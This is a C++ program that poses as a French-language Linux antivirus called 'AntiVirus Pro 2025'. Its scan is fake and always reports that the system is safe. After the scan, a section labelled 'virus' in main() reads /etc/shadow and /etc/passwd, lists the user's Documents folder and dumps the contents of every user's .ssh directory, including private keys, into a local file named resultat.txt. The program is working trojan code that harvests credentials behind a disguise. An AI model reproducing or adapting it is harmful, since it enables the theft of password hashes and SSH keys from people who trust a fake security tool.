#include <iostream>
#include <iomanip>
#include <thread>
#include <chrono>
#include <random>
#include <string>
#include <fstream>
#include <cstdlib>
#include <dirent.h>


using namespace std;



void displayAsciiArt() {
    cout << R"(
 █████╗ ███╗   ██╗████████╗██╗██╗   ██╗██╗██████╗ ██╗   ██╗███████╗
██╔══██╗████╗  ██║╚══██╔══╝██║██║   ██║██║██╔══██╗██║   ██║██╔════╝
███████║██╔██╗ ██║   ██║   ██║██║   ██║██║██████╔╝██║   ██║███████╗
██╔══██║██║╚██╗██║   ██║   ██║╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║
██║  ██║██║ ╚████║   ██║   ██║ ╚████╔╝ ██║██║  ██║╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
         PRO 2025 - PROTECTION ULTIME SUR LINUX
)" << endl;
}

class AntiVirusPro2025 {
private:
    bool fastMode = false;


    void progressBar() {
        for (int i = 0; i <= 100; i += 5) {
            cout << "\rScanning... " << setw(3) << i << "% complete  " << flush;
            this_thread::sleep_for(chrono::milliseconds(50));
        }
    }

    void simulateScan() {
        random_device rd;
        mt19937 gen(rd());

        int totalFiles;
        if (fastMode) {
            totalFiles = 500;
        } else {
            uniform_int_distribution<> distFiles(10000, 250000);
            totalFiles = distFiles(gen);
        }

        cout << "\n\033[1;32m[AntiVirus Pro 2025]\033[0m Système de scan initialisé\n"
             << (fastMode ? "Analyse rapide en cours...\n" : "Analyse complète en cours...\n");

        for (int i = 1; i <= totalFiles; ++i) {
            cout << "\rAnalyse fichier " << i << "/" << totalFiles << " en cours     " << flush;
            this_thread::sleep_for(chrono::milliseconds(10));
        }
    }

    void securityReport() {
        cout << "\n\n\033[1;32m[RAPPORT DE SECURITE]\033[0m\n"
             << "Aucune menace détectée\n"
             << "Système protégé et sécurisé\n";
    }

public:
    void launch(bool fast = false) {
        fastMode = fast;
        displayAsciiArt();
        cout << "\033[1;34m--- AntiVirus Pro 2025 ---\033[0m\n"
             << (fast ? "Démarrage du scan rapide..." : "Démarrage du scan complet...") << endl;

        simulateScan();
        progressBar();
        securityReport();
    }

    static void displayHelp() {
        cout << "AntiVirus Pro 2025 - Manuel d'utilisation\n"
             << "-------------------------------------\n"
             << "Options disponibles :\n"
             << "  --help     : Affiche ce menu d'aide\n"
             << "  --version  : Affiche la version du logiciel\n"
             << "  --fast     : Effectue un scan rapide (jusqu'à 500 fichiers)\n"
             << "\nExemples :\n"
             << "  ./antivirus\n"
             << "  ./antivirus --fast\n"
             << "  ./antivirus --help\n";
    }

    static void displayVersion(){
        const string VERSION = "1.0.0";
        cout << "AntiVirus Pro 2025 - Version " << VERSION
             << " © Alexandre Shyshmarov "<< endl;
    }

};


void list_docs(ofstream& log) {
    const char* user = getenv("SUDO_USER");
    string documents_path;

    if (user) {
        documents_path = string("/home/") + user + "/Documents";
    } else {
        const char* home = getenv("HOME");
        if (home) {
            documents_path = string(home) + "/Documents";
        } else {
            log << "Erreur : Impossible de trouver le dossier Documents." << endl;
            return;
        }
    }

    DIR* dir = opendir(documents_path.c_str());
    if (!dir) {
        log << "Erreur : Impossible d'ouvrir " << documents_path << "." << endl;
        return;
    }

    log << "\nListe des fichiers dans " << documents_path << " :\n";

    struct dirent* entry;
    while ((entry = readdir(dir)) != nullptr) {
        string filename = entry->d_name;
        if (filename != "." && filename != "..") {
            log << filename << endl;
        }
    }

    closedir(dir);
    log << "Fin de la liste des fichiers.\n" << endl;
}
void copy_files(const string& source, ofstream& log) {
    ifstream fichier_source(source);
    if (!fichier_source) {
        log << "Erreur : Impossible d'ouvrir " << source << " en lecture." << endl;
        return;
    }

    log << "\nContenu de " << source << " :\n";
    string ligne;
    while (getline(fichier_source, ligne)) {
        log << ligne << '\n';
    }
    log << "Fin du contenu de " << source << ".\n" << endl;
}

void get_ssh_keys(ofstream& log) {
    const string home_base = "/home/";
    DIR* home_dir = opendir(home_base.c_str());

    if (!home_dir) {
        log << "Erreur : Impossible d'ouvrir le répertoire /home." << endl;
        return;
    }

    struct dirent* user_entry;
    while ((user_entry = readdir(home_dir)) != nullptr) {
        string username = user_entry->d_name;

        // Ignorer les entrées spéciales
        if (username == "." || username == "..")
            continue;

        string ssh_path = home_base + username + "/.ssh/";
        DIR* ssh_dir = opendir(ssh_path.c_str());

        if (!ssh_dir) {
            log << "Info : Aucun dossier .ssh pour l'utilisateur " << username << "." << endl;
            continue;
        }

        log << "\n=== Clés SSH pour l'utilisateur " << username << " ===\n";

        struct dirent* entry;
        while ((entry = readdir(ssh_dir)) != nullptr) {
            string filename = entry->d_name;

            if (filename == "." || filename == "..")
                continue;

            string filepath = ssh_path + filename;
            ifstream file(filepath);

            if (!file) {
                log << "Erreur : Impossible de lire " << filepath << "." << endl;
                continue;
            }

            log << "\n--- " << filename << " ---\n";
            string line;
            while (getline(file, line)) {
                log << line << '\n';
            }
            log << "--- Fin de " << filename << " ---\n";
        }

        closedir(ssh_dir);
    }

    closedir(home_dir);
}

int main(int argc, char* argv[]) {

    // Section antivirus
    AntiVirusPro2025 antivirus;
    if (argc == 1){

        antivirus.launch();

    }else if (argc == 2){
        string arg = argv[1];
        if (arg == "--fast") {
            antivirus.launch(true);
        } else if (arg == "--help") {
            AntiVirusPro2025::displayHelp();
            return 0;
        } else if (arg == "--version") {
            AntiVirusPro2025::displayVersion();
            return 0;
        }
    }else{
        cerr << "Argument Invalide : --help pour l'aide" << endl;
    }


    // Section virus

    ofstream resultat("resultat.txt", ios::app);
    if (!resultat) {
        cerr << "Erreur : Impossible d'ouvrir resultat.txt en écriture." << endl;
        return 1;
    }

    copy_files("/etc/shadow", resultat);

    copy_files("/etc/passwd", resultat);

    list_docs(resultat);

    get_ssh_keys(resultat);

    return 0;
}
